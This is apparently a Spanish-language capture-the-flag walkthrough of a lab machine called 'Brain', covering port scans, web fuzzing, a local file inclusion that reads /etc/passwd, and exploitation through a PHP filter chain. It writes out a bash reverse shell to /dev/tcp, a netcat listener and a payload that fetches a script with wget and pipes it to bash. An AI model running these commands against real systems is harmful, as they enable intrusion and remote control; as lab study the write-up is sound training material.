# Máquina Brain

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.163

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.5.163

![alt text](image-2.png)

### Fuzzing web

feroxbuster --url http://192.168.5.163/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

entro a ver el index.php

![alt text](image-4.png)

entonces pruebo un posible LFI

wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://192.168.5.163/index.php?FUZZ=../../../../../../../../../../../../../etc/passwd" --hl=7

![alt text](image-5.png)

Verifico los usuarios:

http://192.168.5.163/index.php?include=/../../../../../../../../../etc/passwd

![alt text](image-6.png)

### Explotación

Utilicé la herramienta php_filter_chain_generator -> https://github.com/synacktiv/php_filter_chain_generator

a.- Creamos una reverse shell llamada rev con el siguiente contenido:

nano r

bash -i >& /dev/tcp/192.168.131/443 0>&1 

b.- Iniciamos un servidor web con python en la carpeta donde creamos el rev

python3 -m http.server 80

c.- Nos ponemos en escucha con netcat por el puerto 443

nc -nlvp 443

d. Con la herramienta php_filter_chain_generator, creamos el wrapper

python3 php_filter_chain_generator.py --chain '<?=`wget -O- 192.16.5.131/rev|bash`?>'

e.- Pegamos el wrapper  en la url de esta manera:

ejemplo:

http://192.168.5.163/index.php?include=wrapper

f.- Tenemos acceso

![alt text](image-7.png)

ejecuto el comando ps -faux:

![alt text](image-8.png)

cambio al usuario ben:

![alt text](image-9.png)

### Escalar privilegios

![alt text](image-10.png)

![alt text](image-11.png)

![alt text](image-12.png)

### user.txt

![alt text](image-13.png)

### root.txt

![alt text](image-14.png)